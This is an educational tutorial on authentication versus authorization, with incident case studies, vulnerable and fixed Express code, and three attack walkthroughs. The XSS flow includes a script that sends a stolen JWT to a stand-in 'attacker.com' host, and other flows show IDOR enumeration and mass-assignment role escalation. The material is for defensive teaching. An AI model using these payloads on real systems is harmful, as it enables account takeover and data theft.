# Authentication vs Authorization — Part 1 of 3

### Sections: 1 (Attacker Intuition), 2 (Why It Exists), 3 (Core Technical Explanation), 4 (Attack Flow)

**Series:** Authentication & Security → Topic 01

---

## SECTION 1 — Attacker Intuition

### Start Here: What the Attacker Wants

Before any definition, you must think like the attacker. Every breach starts with a goal.

The attacker wants one of three things:

```
1. ACCESS AS SOMEONE ELSE (Identity theft / impersonation)
   "I want to log in as user@victim.com without knowing their password"

2. ESCALATE THEIR OWN ACCESS (Privilege escalation)
   "I have a free account. I want admin access without paying or being admin."

3. ACCESS RESOURCES THEY SHOULD NOT SEE (Broken access control)
   "I'm user 1001. I want to read user 1002's invoices."
```

These three goals map directly to the two failures that make attacks possible:

```
Authentication failure → Attacker gets in as someone else
Authorization failure  → Attacker accesses things they shouldn't reach
```

---

### The Hotel Analogy (How All Three Attacks Work)

Picture a premium hotel:

```
HOTEL SECURITY SYSTEM:
  Check-in desk  → AUTHENTICATION  (who are you? show your ID + reservation)
  Room key card  → AUTHORIZATION   (which doors can this card open?)

ATTACK 1 — Authentication Bypass:
  Attacker steals a guest's key card from the lobby.
  Hotel never re-verifies identity. Card still works.
  Attacker walks into that guest's room. Entire identity compromised.

  Real equivalent:
  Attacker steals a JWT token from browser localStorage.
  Server never checks if the token was issued to this device.
  Attacker makes API calls as the victim. Total account takeover.

ATTACK 2 — Authorization Escalation (Horizontal):
  Guest in Room 312 finds their key card also opens Room 313.
  They're authenticated (they're a real guest) but accessing a room they shouldn't.

  Real equivalent:
  GET /api/invoices/1001  → logged-in user sees their own invoice (correct)
  GET /api/invoices/1002  → same token, IDOR, they see another user's invoice
  They were authenticated. Authorization was never checked.

ATTACK 3 — Vertical Privilege Escalation:
  A hotel cleaner finds an admin master key in a supply closet.
  They're a real employee, but now they can open any room — including VIP floors.

  Real equivalent:
  Regular user finds an API endpoint that changes their own role.
  POST /api/users/me { "role": "admin" }
  No authorization check on who can modify the role field.
  User is now admin. Full system access.
```

---

### The Core Developer Mistake

```
MOST COMMON CONFUSION:
Developers know to add authentication ("is the user logged in?").
Developers FORGET or incorrectly implement authorization ("can THIS user do THIS action?").

They write:
  if (request.user) {  // authenticated? yes → proceed
    return db.getInvoice(invoiceId);
  }

They forget:
  if (request.user && invoice.userId === request.user.id) {  // IS THIS THEIR INVOICE?
    return db.getInvoice(invoiceId);
  }

OWASP Top 10: Broken Access Control has been #1 since 2021.
This is not a rare mistake. It is the most common security failure on the internet.
```

---

## SECTION 2 — Why This Concept Exists

### The Incidents That Made This Non-Negotiable

**The Peloton API Leak (2021)**

```
INCIDENT SUMMARY:
  Peloton's API returned full user profile data for any user ID.
  Any user could call: GET /api/user/{anyUserId}
  Response: name, age, city, workout stats, weight, gender, birthday.

  Required to exploit: a valid Peloton account (authentication passed).
  Missing check: does this account own this user profile? (authorization missing entirely).

HOW IT WAS DISCOVERED:
  Security researcher Jan Masters created two accounts.
  Used Account A's token to fetch Account B's profile. Worked immediately.
  Data was publicly leaking for months before discovery.

WHAT AN ATTACKER COULD DO:
  Enumerate user IDs sequentially: /api/user/1, /api/user/2, /api/user/3...
  Harvest personal health data for millions of users.
  Sell to data brokers, health insurance companies, or use for targeted phishing.

LEGAL EXPOSURE:
  HIPAA: health data (weight, workout frequency, fitness level) = PHI
  GDPR: EU users' personal data unauthorized exposure = up to €20M or 4% global revenue
  California CCPA: class action lawsuit exposure

ROOT CAUSE: No authorization check on the user profile endpoint.
  Code likely looked like:
    router.get('/user/:id', authenticate, async (req, res) => {
      const user = await User.findById(req.params.id);
      return res.json(user);  // MISSING: check req.user.id === req.params.id
    });
```

**The Parler Breach (2021)**

```
INCIDENT SUMMARY:
  Parler used sequential post IDs with no authorization checks.
  Every post, deleted or public, was accessible via sequential ID enumeration.
  GET /v1/posts/{sequential_id} — no ownership check, no auth for "deleted" posts.

WHAT HAPPENED:
  Activists downloaded 70+ TB of data before AWS shut down the platform.
  Includes: deleted posts with embedded GPS coordinates from photos.
  Photos contained EXIF data with precise GPS coordinates of users' locations.
  Many of the users were involved in the January 6, 2021 Capitol events.
  GPS data was extracted and published — users identified by location.

ROOT CAUSE:
  1. Sequential IDs (predictable, enumerable)
  2. No authorization check: deleted = hidden in UI, still accessible via API
  3. No rate limiting (download completed in hours)

  Correct design:
  - UUIDs for post IDs (non-enumerable)
  - Authorization: req.user must own the post OR post must be public
  - Soft delete = API returns 404 to non-owner (access denied on deleted content)
```

**Facebook Graph API Token Theft (2018)**

```
INCIDENT SUMMARY:
  Attackers exploited three chained bugs to steal access tokens for 50 million accounts.
  Key failure: access tokens were not scoped properly.
  Stealing ONE token gave access to: profile, friends, posts, private photos.

LESSON:
  Authentication token theft = full authorization as the victim.
  If tokens are not short-lived, not scoped, not bound to device:
  One stolen token = total account control until token expires or is revoked.
  Old Facebook tokens: 60-day default lifetime.
  60 days of full access to 50 million accounts.
```

### What Breaks Without These Concepts Separated

```
APPLICATION TYPE    AUTHENTICATION FAILURE           AUTHORIZATION FAILURE
────────────────────────────────────────────────────────────────────────────────
E-commerce          Account takeover, fraudulent      User A views User B's
                    purchases on victim's account     orders, addresses, payment
                                                      methods

Banking             Fraudulent transfers              One customer accesses
                    from compromised account          another customer's accounts

Healthcare          Patient impersonation             Patient views other
                    in appointment system             patients' medical records

SaaS (B2B)          Competitor logs in as your        Employee views other
                    company's admin account           company's data (tenant leak)

Social Media        Attacker posts as victim          User reads private DMs
                                                      of non-friends

Internal Tools      Contractor accesses               Junior engineer deletes
                    production databases              production database
```

---

## SECTION 3 — Core Technical Explanation

### Precise Definitions (After You Understand the Attacks)

```
AUTHENTICATION (AuthN):
  "Prove who you are."

  Question: Are you who you claim to be?
  Mechanism: Verify that the credential presented belongs to the claimed identity.
  Output: An established identity (user ID, session, token with claims).

  Examples:
  - Username + password check against database hash
  - OAuth token validated against provider
  - JWT signature verified + issuer + audience claims checked
  - Biometric match on device
  - Certificate chain validated

AUTHORIZATION (AuthZ):
  "What are you allowed to do?"

  Question: Does this identity have permission for this resource + action?
  Input: The established identity from authentication + the requested action.
  Output: Allow or Deny.

  Examples:
  - Does userId 1001 own invoiceId 9987?
  - Is this user's role in ['admin', 'billing_manager']?
  - Has this API key been granted write:events scope?
  - Is this request coming from within the allowed IP range?
  - Has this user consented to this OAuth scope?
```

---

### How Authentication Works Internally

```
SESSION-BASED AUTHENTICATION:

Client                          Server                        Database
  │                               │                               │
  │── POST /login ───────────────>│                               │
  │   { email, password }         │── SELECT hash WHERE email ───>│
  │                               │<─ { password_hash, user_id } ─│
  │                               │   bcrypt.compare(password,    │
  │                               │     hash) → true              │
  │                               │── INSERT sessions ────────────>│
  │                               │   (session_id, user_id, expiry)│
  │<── Set-Cookie: sid=abc ───────│                               │
  │    (HttpOnly, Secure, SameSite)│                              │
  │                               │                               │
  │── GET /dashboard ────────────>│                               │
  │   Cookie: sid=abc (auto-sent) │── SELECT * FROM sessions ────>│
  │                               │   WHERE id='abc' AND           │
  │                               │   expires > NOW()              │
  │                               │<─ { user_id: 1001, ... } ─────│
  │                               │   identity established         │
  │<── 200 OK dashboard ──────────│                               │

SECURITY OUTCOME:
  Session ID never contains user data (it's just a pointer to server-side state).
  Attacker stealing session ID can impersonate user only until expiry.
  Logout: delete session row → session ID is dead immediately.
```

```
JWT-BASED AUTHENTICATION:

Client                          Server (Stateless)
  │                               │
  │── POST /login ───────────────>│  verify password, generate JWT:
  │                               │  header: { alg: "RS256", typ: "JWT" }
  │                               │  payload: {
  │                               │    sub: "user_1001",
  │                               │    email: "alice@example.com",
  │                               │    role: "customer",
  │                               │    iss: "https://auth.invoiceflow.com",
  │                               │    aud: "https://api.invoiceflow.com",
  │                               │    iat: 1705326600,
  │                               │    exp: 1705330200   // +1 hour
  │                               │  }
  │                               │  signature: RS256(base64(header.payload), private_key)
  │                               │
  │<── { token: "eyJ..." } ───────│
  │                               │
  │── GET /dashboard ────────────>│
  │   Authorization: Bearer eyJ..│
  │                               │  verify JWT:
  │                               │  1. Decode header → alg: RS256
  │                               │  2. Verify signature with PUBLIC key
  │                               │  3. Check exp > now()
  │                               │  4. Check iss === expected issuer
  │                               │  5. Check aud === this service
  │                               │  Identity established from claims.
  │<── 200 OK ────────────────────│  No database lookup needed.

SECURITY PROPERTIES:
  Signature: forging payload without private key is computationally infeasible.
  Stateless: no session database query on every request.
  Expiry: short-lived tokens limit window of compromise.
  Issuer/Audience claims: JWT from service A cannot be replayed at service B.
```

---

### How Authorization Works Internally

```
THREE AUTHORIZATION MODELS:

1. RBAC — Role-Based Access Control (most common):
   User has roles. Roles have permissions.

   Database:
   users_roles: { user_id, role_id }
   roles_permissions: { role_id, permission: "invoices:write" }

   Check:
   user → has role "billing_manager"?
   role "billing_manager" → has permission "invoices:write"?

   Used by: AWS IAM at the service level, most B2B SaaS applications.

2. ABAC — Attribute-Based Access Control:
   Decision based on attributes of user, resource, environment.

   Policy: "User can edit a document IF user.department === document.department
            AND user.clearanceLevel >= document.sensitivityLevel"

   More granular, more complex. Used in: healthcare (HIPAA), government systems.

3. Resource-Based Ownership (most important for APIs):
   "The requesting user must be the owner of the resource."

   Check: resource.userId === request.user.id

   This catches IDOR (Insecure Direct Object Reference) — the #1 API attack.
```

---

### BAD Implementation — Typical Developer Mistake

```javascript
// DANGEROUS: Authentication only, no authorization
router.get("/invoices/:id", authenticate, async (req, res) => {
  // authenticate middleware runs → req.user is populated
  // MISTAKE: We confirmed the user is logged in but NEVER checked if
  //          this invoice belongs to them

  const invoice = await db.query("SELECT * FROM invoices WHERE id = $1", [
    req.params.id,
  ]);

  if (!invoice) return res.status(404).json({ error: "Not found" });

  // Any authenticated user can retrieve any invoice by ID
  // Attacker: logged in as user A → GET /invoices/any_id → sees all invoices
  return res.json(invoice);
});
```

```
IMPACT:
  10,000 users × 10 invoices each = 100,000 invoice IDs.
  Sequential IDs (inv_1, inv_2...inv_100000): enumerable in hours.
  Each invoice: customer name, address, line items, payment status, amount.

  That is a complete customer database exfiltration requiring only a free account.
```

---

### SECURE Implementation

```javascript
// CORRECT: Authentication + Resource Ownership Authorization
router.get("/invoices/:id", authenticate, async (req, res) => {
  const { id } = req.params;
  const requestingUserId = req.user.id; // from verified JWT or session

  // Option A: Fetch with ownership check in query
  const invoice = await db.query(
    "SELECT * FROM invoices WHERE id = $1 AND user_id = $2",
    [id, requestingUserId], // user_id must match — database enforces it
  );

  // If invoice doesn't exist OR doesn't belong to this user:
  // Both return 404 → attacker cannot distinguish "doesn't exist" from "not yours"
  if (!invoice) return res.status(404).json({ error: { code: "NOT_FOUND" } });

  return res.json(invoice);

  // Option B: Fetch then check (when you need the resource for other logic)
  // const invoice = await db.query('SELECT * FROM invoices WHERE id = $1', [id]);
  // if (!invoice) return res.status(404)...;
  // if (invoice.userId !== requestingUserId) return res.status(403)...;
  //   NOTE: returning 404 for wrong-owner is BETTER than 403 — 403 confirms existence
});

// RBAC check for admin-only operations
router.delete(
  "/invoices/:id",
  authenticate,
  authorize("admin"),
  async (req, res) => {
    // authorize middleware checks req.user.role
  },
);

// Middleware: role check
const authorize =
  (...requiredRoles) =>
  (req, res, next) => {
    if (!requiredRoles.some((role) => req.user.roles.includes(role))) {
      return res.status(403).json({
        error: {
          code: "INSUFFICIENT_PERMISSIONS",
          message: "You do not have permission to perform this action",
        },
      });
    }
    next();
  };
```

---

## SECTION 4 — Attack Flows

### Attack Flow 1: JWT Token Theft → Full Account Takeover

```
SCENARIO:
  Developer stored JWT in localStorage (common mistake).
  Application has an XSS vulnerability (stored or reflected).

STEP-BY-STEP ATTACK:

Step 1 — Discovery:
  Attacker finds XSS in product review field:
  POST /reviews { "content": "<script>/* test */</script>" }
  Review is rendered as HTML on product page. Script executes.
  XSS confirmed.

Step 2 — Payload deployment:
  Attacker submits malicious review:
  { "content": "<script>
    var token = localStorage.getItem('auth_token');
    new Image().src='https://attacker.com/steal?t=' + btoa(token);
  </script>" }

Step 3 — Victim triggers it:
  Victim visits the product page.
  Their browser executes the script.
  Their JWT is fetched from localStorage.
  Browser makes GET request to attacker.com with the token in the URL.
  Attacker receives: t=eyJhbGciOiJSUzI1NiIsInR... (base64-encoded JWT)

Step 4 — Token replay:
  Attacker decodes: jwt.io → sub: "user_5512", email: "alice@example.com", role: "premium"
  Attacker makes API calls:
  GET /api/account
  Authorization: Bearer eyJhbGciOiJSUzI1NiIs...
  → Server: signature valid, not expired, identity established as user_5512.
  Server sees no difference between Alice and the attacker.

Step 5 — Account compromised:
  Attacker changes email address: PUT /api/account { "email": "attacker@evil.com" }
  Attacker requests password reset to new email.
  Alice is permanently locked out of her own account.
  If payment methods saved: Attacker places orders as Alice.

WHY EACH STEP SUCCEEDED:
  Step 2: localStorage is accessible to ANY JavaScript on the same origin.
            There is no security boundary between application code and
            attacker-injected code when XSS exists.
  Step 4: JWT is stateless — server cannot tell what device or IP originally obtained the token.
  Step 5: Server only checks signature and expiry — identity is the token claims only.

  TWO VULNERABILITIES CHAINED:
  XSS (enabled token theft) + JWT in localStorage (token accessible) = account takeover
```

---

### Attack Flow 2: IDOR (Insecure Direct Object Reference) — Horizontal Privilege Escalation

```
SCENARIO:
  E-commerce API with no authorization check on order endpoints.

STEP-BY-STEP ATTACK:

Step 1 — Attacker creates account and places one order.
  Response: { "order_id": "order_4821", ... }

Step 2 — Attacker notices sequential-looking IDs.
  Tries: GET /api/orders/order_4820 → another user's order
  Success. Same JWT, different order ID.

Step 3 — Write a script to enumerate orders:
  for orderId in range(1, 10000):
    GET /api/orders/order_{orderId}
    → name, address, items, payment last 4 digits, delivery status

Step 4 — Data harvested:
  Full customer database: names, home addresses, purchase history.
  Cross-reference with social media → identify high-value targets for physical crime.
  Sell address + purchase item list to organized crime (home robbery).

Step 5 — Targeted attack:
  Attacker knows victim ordered an expensive laptop, lives at [address],
  delivery expected Thursday.
  Intercept the package at the door, or target the empty home.

WHY EACH STEP SUCCEEDED:
  No ownership check: server returned any order to any authenticated user.
  Sequential IDs: predictable range, easy to enumerate.
  No rate limiting: thousands of requests went undetected.
  No anomaly detection: no alert on single IP fetching thousands of order IDs.
```

---

### Attack Flow 3: Vertical Privilege Escalation — Mass Assignment

```
SCENARIO:
  Developer uses Object.assign(user, req.body) to update user profile.
  User profile object includes a role field in the database.

STEP-BY-STEP ATTACK:

Step 1 — Attacker creates normal account. JWT shows: role: "user"

Step 2 — Attacker calls profile update:
  PATCH /api/users/me
  { "name": "Alice", "bio": "Engineer", "role": "admin" }

  Server code:
    const updates = req.body;  // { name, bio, role }
    Object.assign(currentUser, updates);  // ALL fields copied, including role
    await db.save(currentUser);  // role: "admin" saved to database

Step 3 — Attacker now has admin role:
  New JWT issued: { sub: "attacker_id", role: "admin" }

Step 4 — Admin access exercised:
  GET /api/admin/users → all user records
  DELETE /api/users/{any_id} → delete any account
  GET /api/admin/config → internal configuration, API keys

WHY IT SUCCEEDED:
  Mass assignment: developer trusted all fields from request body.
  No allowlist: no explicit list of which fields can be user-modified.
  role field: never should be user-settable, but was included in bulk update.

REAL-WORLD EXAMPLE:
  GitHub mass assignment vulnerability (2012): attackers added their SSH key
  to any repository by mass-assigning through the API. Rails framework
  shipped with this vulnerability by default in attr_accessible.
  This led to Rails disabling mass assignment by default in Rails 4.
```
